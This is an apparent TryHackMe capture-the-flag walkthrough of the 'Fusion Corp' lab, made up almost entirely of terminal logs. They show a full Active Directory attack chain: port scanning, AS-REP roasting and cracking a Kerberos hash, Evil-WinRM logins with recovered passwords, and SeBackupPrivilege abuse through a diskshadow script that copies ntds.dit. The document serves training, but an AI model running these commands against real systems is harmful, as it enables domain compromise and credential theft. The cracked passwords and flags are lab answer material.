----
Fusion Corp said they got everything patched... did they?
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/c7c5cbaebf5b3c858e7c37f4213ab6e1.jpeg)

### Task 1  Fusion Corp

 Start Machine

Please give the VM 5-10 minutes to fully boot.  

  

You had an engagement a while ago for Fusion Corp. They contacted you saying they've patched everything reported and you can start retesting.

Answer the questions below

```
──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.50.4 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.50.4:53
Open 10.10.50.4:80
Open 10.10.50.4:88
Open 10.10.50.4:135
Open 10.10.50.4:139
Open 10.10.50.4:389
Open 10.10.50.4:445
Open 10.10.50.4:464
Open 10.10.50.4:593
Open 10.10.50.4:3269
Open 10.10.50.4:3268
Open 10.10.50.4:3389
Open 10.10.50.4:5985
Open 10.10.50.4:9389
Open 10.10.50.4:49666
Open 10.10.50.4:49677
Open 10.10.50.4:49668
Open 10.10.50.4:49669
Open 10.10.50.4:49670
Open 10.10.50.4:49689
Open 10.10.50.4:49699
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 14:38 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:38
Completed Parallel DNS resolution of 1 host. at 14:38, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:38
Scanning 10.10.50.4 [21 ports]
Discovered open port 53/tcp on 10.10.50.4
Discovered open port 445/tcp on 10.10.50.4
Discovered open port 135/tcp on 10.10.50.4
Discovered open port 3389/tcp on 10.10.50.4
Discovered open port 139/tcp on 10.10.50.4
Discovered open port 80/tcp on 10.10.50.4
Discovered open port 49699/tcp on 10.10.50.4
Discovered open port 49689/tcp on 10.10.50.4
Discovered open port 593/tcp on 10.10.50.4
Discovered open port 88/tcp on 10.10.50.4
Discovered open port 49666/tcp on 10.10.50.4
Discovered open port 3269/tcp on 10.10.50.4
Discovered open port 49670/tcp on 10.10.50.4
Discovered open port 5985/tcp on 10.10.50.4
Discovered open port 389/tcp on 10.10.50.4
Discovered open port 49677/tcp on 10.10.50.4
Discovered open port 9389/tcp on 10.10.50.4
Discovered open port 49668/tcp on 10.10.50.4
Discovered open port 49669/tcp on 10.10.50.4
Discovered open port 464/tcp on 10.10.50.4
Discovered open port 3268/tcp on 10.10.50.4
Completed Connect Scan at 14:38, 0.41s elapsed (21 total ports)
Initiating Service scan at 14:38
Scanning 21 services on 10.10.50.4
Completed Service scan at 14:39, 57.29s elapsed (21 services on 1 host)
NSE: Script scanning 10.10.50.4.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
NSE Timing: About 99.97% done; ETC: 14:39 (0:00:00 remaining)
Completed NSE at 14:39, 40.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 4.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Nmap scan report for 10.10.50.4
Host is up, received user-set (0.20s latency).
Scanned at 2023-07-21 14:38:10 EDT for 103s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-07-21 18:38:18Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2023-07-21T18:39:49+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-21T18:39:10+00:00
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-20T18:06:36
| Not valid after:  2024-01-19T18:06:36
| MD5:   d896df4ba43ee9f0996019b5e46d6678
| SHA-1: e1b0787c13757d619c77802bafdefb5ccd339401
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQQxCmr+BQ5qRDlkCauFFsZTANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNvcnAwHhcNMjMwNzIwMTgwNjM2
| WhcNMjQwMTE5MTgwNjM2WjAgMR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNv
| cnAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDW9rDNe6wuLClHzVZd
| 6wm1tAC0tUHPWFK043xOA+2tU4My40Y7Nnmb+3GMEA/wZdcVtkOBDOwixDDE8iKv
| vRwE9NmOhy3/4NA7itsoS6lyTjeUlbzR4xKlC4gNAvbrmAiYziIVB6USwU1WWJUC
| lfZCAChOh9uyGuBvWAAZRnVyj1n57OhuD6nQjKRpBEEMLdZoAQS1rYv2VOrWhhLt
| yV9Cpr+7mdqMDCY5Lz0zbe6OFfrUPcE2Un185vLuiavMjPFumosPvw03skdRHyN6
| FJdF2atj9H51X2jBxlZdxJxTyZ03lmEPd1dH7rKv+JxDTLfAS6CPev424SAtsMEn
| 4q29AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAAzStTi1/p0tzqS5fj5tnyNwFWdkjDgrcBVprwGOw
| kvmb0WMwOOluAal1m1OKOwcZnIwWzXRrs3BSJewj4Tw2hXo7rok7sySogRVoqNG7
| 8W4348VgdaFcIlMD7m3HSj9k8GDajGgFtVjUzVYGhWIAanFkWI9YPgYDmU3NEA7m
| vPQKwTMK35dBzBIGO/I3u1QUaoyCL7uCYNi2V/ZhZtwPpaySQkZbuzWLAQ9qhi/H
| VtuvOCY1u74IlaF0nd13cqsActxzNvLGLGGPpb7BFrX+o/w2M7jF58zUjnW+J5Vm
| dObg4LdihFHdmQgmfp1RTStEfBoHVUkecOr9RD2OdEM7xw==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29730/tcp): CLEAN (Timeout)
|   Check 2 (port 60869/tcp): CLEAN (Timeout)
|   Check 3 (port 41214/udp): CLEAN (Timeout)
|   Check 4 (port 21353/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-07-21T18:39:13
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.40 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.50.4/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.50.4/-_23-07-21_14-42-31.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-21_14-42-31.log

Target: http://10.10.50.4/

[14:42:32] Starting: 
[14:42:41] 301 -  148B  - /backup  ->  http://10.10.50.4/backup/
[14:42:47] 301 -  145B  - /css  ->  http://10.10.50.4/css/
[14:42:57] 301 -  145B  - /img  ->  http://10.10.50.4/img/
[14:42:59] 200 -   53KB - /index.html
[14:43:00] 301 -  144B  - /js  ->  http://10.10.50.4/js/
[14:43:01] 301 -  145B  - /lib  ->  http://10.10.50.4/lib/

Task Completed

go to backup
open employees.ods

usernames

jmickel
aarnold
llinda
jpowel
dvroslav
tjefferson
nmaurin
mladovic
lparker
kgarland
dpertersen

┌──(witty㉿kali)-[~/Downloads]
└─$ cat username_fusion 
jmickel
aarnold
llinda
jpowel
dvroslav
tjefferson
nmaurin
mladovic
lparker
kgarland
dpertersen

┌──(witty㉿kali)-[~/Downloads]
└─$ rpcclient -U% 10.10.50.4   
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)

┌──(witty㉿kali)-[~/Downloads]
└─$ rdesktop -f -u "" 10.10.50.4   
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=Fusion-DC.fusion.corp


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=Fusion-DC.fusion.corp
     Issuer: CN=Fusion-DC.fusion.corp
 Valid From: Thu Jul 20 14:06:36 2023
         To: Fri Jan 19 13:06:36 2024

  Certificate fingerprints:

       sha1: e1b0787c13757d619c77802bafdefb5ccd339401
     sha256: b80d5c07940fa8efc1a2d784895649ea521228f453a970d11087a08f83214f16


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).

┌──(witty㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.50.4 -u guest -p ""
SMB         10.10.50.4      445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
SMB         10.10.50.4      445    FUSION-DC        [-] fusion.corp\guest: STATUS_ACCOUNT_DISABLED 
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.50.4 -u kali -p "" 
SMB         10.10.50.4      445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
SMB         10.10.50.4      445    FUSION-DC        [-] fusion.corp\kali: STATUS_LOGON_FAILURE

┌──(witty㉿kali)-[~/Downloads]
└─$ ldapsearch -x -s base namingcontexts -H ldap://10.10.50.4   
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=fusion,DC=corp
namingcontexts: CN=Configuration,DC=fusion,DC=corp
namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp
namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp
namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

┌──(witty㉿kali)-[~/Downloads]
└─$ ./kerbrute userenum -d 'fusion.corp' --dc 10.10.50.4 username_fusion 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/21/23 - Ronnie Flathers @ropnop

2023/07/21 15:00:00 >  Using KDC(s):
2023/07/21 15:00:00 >  	10.10.50.4:88

2023/07/21 15:00:00 >  [+] VALID USERNAME:	 lparker@fusion.corp
2023/07/21 15:00:01 >  Done! Tested 11 usernames (1 valid) in 0.490 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ GetNPUsers.py -no-pass -dc-ip 10.10.50.4 fusion.corp/lparker 
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

[*] Getting TGT for lparker
$krb5asrep$23$lparker@FUSION.CORP:74db6fccc04b5f93c6dd76c5de346390$bff238721779563586cdb7df2ba506a78c826f0e5573d589befd3e05f75316f96eb33586b5e7746cddbf65f657465f10015b22cb4a4e4acf8101f6951f432aee837863eeb4ee129632a367788389b4c561cf5eb229fe22f81d827bef7b83439494a96ce474e79790c2dc11873d66eadf6261f21bc1cb11563da0e279d5cd27fa609c9b15e948c08fe190c961d70e41630880c889c129434be4e4ee0f9594b91d390132c0e92288bcc24ae9b7335360186f86bebf12e409fbceada514584edf7d01a99ef416235a45255b7ab935c26c0229c4e7812524b6d78af7901775249002adb62f6c33dc6c56dd94

┌──(witty㉿kali)-[~/Downloads]
└─$ cat lparker_hash                                           
$krb5asrep$23$lparker@FUSION.CORP:74db6fccc04b5f93c6dd76c5de346390$bff238721779563586cdb7df2ba506a78c826f0e5573d589befd3e05f75316f96eb33586b5e7746cddbf65f657465f10015b22cb4a4e4acf8101f6951f432aee837863eeb4ee129632a367788389b4c561cf5eb229fe22f81d827bef7b83439494a96ce474e79790c2dc11873d66eadf6261f21bc1cb11563da0e279d5cd27fa609c9b15e948c08fe190c961d70e41630880c889c129434be4e4ee0f9594b91d390132c0e92288bcc24ae9b7335360186f86bebf12e409fbceada514584edf7d01a99ef416235a45255b7ab935c26c0229c4e7812524b6d78af7901775249002adb62f6c33dc6c56dd94
                                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt lparker_hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!abbylvzsvs2k6! ($krb5asrep$23$lparker@FUSION.CORP)     
1g 0:00:00:02 DONE (2023-07-21 15:04) 0.4219g/s 1038Kp/s 1038Kc/s 1038KC/s !@#$%&..ๅๅ/จๅๅ/จ
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ evil-winrm -i 10.10.50.4 -u lparker
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lparker\Documents> ls
*Evil-WinRM* PS C:\Users\lparker\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\lparker\Desktop> ls


    Directory: C:\Users\lparker\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\lparker\Desktop> cat flag.txt
THM{c105b6fb249741b89432fada8218f4ef}

*Evil-WinRM* PS C:\Users\lparker\Documents> cd ..\..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2021   3:49 AM                Administrator
d-----         3/3/2021   5:54 AM                jmurphy
d-----         3/3/2021   5:54 AM                lparker
d-r---         3/3/2021   3:49 AM                Public

┌──(witty㉿kali)-[~/Downloads]
└─$ rpcclient -U lparker 10.10.139.18     
Password for [WORKGROUP\lparker]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lparker] rid:[0x44f]
user:[jmurphy] rid:[0x450]
rpcclient $> queryuser jmurphy
	User Name   :	jmurphy
	Full Name   :	Joseph Murphy
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Password set to u8WC3!kLsgw=#bRY
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 13 Sep 30828 22:48:05 EDT
	Password last set Time   :	Wed, 03 Mar 2021 08:41:25 EST
	Password can change Time :	Wed, 03 Mar 2021 08:41:25 EST
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x450
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...

┌──(witty㉿kali)-[~/Downloads]
└─$ evil-winrm -i 10.10.139.18 -u jmurphy
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jmurphy\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> ls


    Directory: C:\Users\jmurphy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\jmurphy\Desktop> cat flag.txt
THM{b4aee2db2901514e28db4242e047612e}

*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\jmurphy\Desktop> cd C:\
*Evil-WinRM* PS C:\> mkdir c:\tmp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2023   5:06 PM                tmp


*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2021   3:59 AM                inetpub
d-----         3/7/2021   2:02 AM                PerfLogs
d-r---         3/7/2021   2:52 AM                Program Files
d-----         3/3/2021   3:49 AM                Program Files (x86)
d-----         3/3/2021   6:07 AM                stuff
d-----        7/21/2023   5:06 PM                tmp
d-r---         3/3/2021   5:54 AM                Users
d-----         3/7/2021   2:59 AM                Windows

like razorblack SeBackupPrivilege 

┌──(witty㉿kali)-[~/Downloads]
└─$ cat diskshadow.txt 
set context persistent nowriters #
set metadata c:\tmp\metadata.cab #
add volume c: alias myAlias #
create #
expose %myAlias% x: #
exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit #
delete shadows volume %myAlias% #
reset #

https://github.com/giuliano108/SeBackupPrivilege/

┌──(witty㉿kali)-[~/Downloads]
└─$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
--2023-07-21 20:11:55--  https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
Resolving github.com (github.com)... 140.82.113.3
Connecting to github.com (github.com)|140.82.113.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll [following]
--2023-07-21 20:11:56--  https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [application/octet-stream]
Saving to: ‘SeBackupPrivilegeUtils.dll’

SeBackupPrivilege 100%[============>]  16.00K  --.-KB/s    in 0s      

2023-07-21 20:11:56 (47.3 MB/s) - ‘SeBackupPrivilegeUtils.dll’ saved [16384/16384]

                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
--2023-07-21 20:12:06--  https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Resolving github.com (github.com)... 140.82.114.3
Connecting to github.com (github.com)|140.82.114.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll [following]
--2023-07-21 20:12:07--  https://raw.githubusercontent.com/giuliano108/SeBackupPrivilege/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12288 (12K) [application/octet-stream]
Saving to: ‘SeBackupPrivilegeCmdLets.dll’

SeBackupPrivilege 100%[============>]  12.00K  --.-KB/s    in 0s      

2023-07-21 20:12:07 (48.7 MB/s) - ‘SeBackupPrivilegeCmdLets.dll’ saved [12288/12288]

*Evil-WinRM* PS C:\> cd tmp
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
Info: Uploading diskshadow.txt to C:\tmp\diskshadow.txt

                                                             
Data: 316 bytes of 316 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  FUSION-DC,  7/21/2023 5:14:06 PM

-> set context persistent nowriters
-> set metadata c:\tmp\metadata.cab
-> add volume c: alias myAlias
-> create
Alias myAlias for shadow ID {442a3105-351c-426b-991f-2fc7a9111ee4} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7b893c79-a377-46d6-bf60-6a9cc9ef7d0a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7b893c79-a377-46d6-bf60-6a9cc9ef7d0a}

	* Shadow copy ID = {442a3105-351c-426b-991f-2fc7a9111ee4}		%myAlias%
		- Shadow copy set: {7b893c79-a377-46d6-bf60-6a9cc9ef7d0a}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 7/21/2023 5:14:11 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: Fusion-DC.fusion.corp
		- Service machine: Fusion-DC.fusion.corp
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %myAlias% x:
-> %myAlias% = {442a3105-351c-426b-991f-2fc7a9111ee4}
The shadow copy was successfully exposed as x:\.
-> exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit

The script file name is not valid.

EXEC <file.cmd>
        Execute a script file on the local machine.
        This command is used to duplicate or restore data as part of
        a backup or restore sequence.
        
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\flag.txt C:\Users\jmurphy\Documents\flag.txt
*Evil-WinRM* PS C:\tmp> cat C:\Users\jmurphy\Documents\flag.txt
THM{f72988e57bfc1deeebf2115e10464d15}


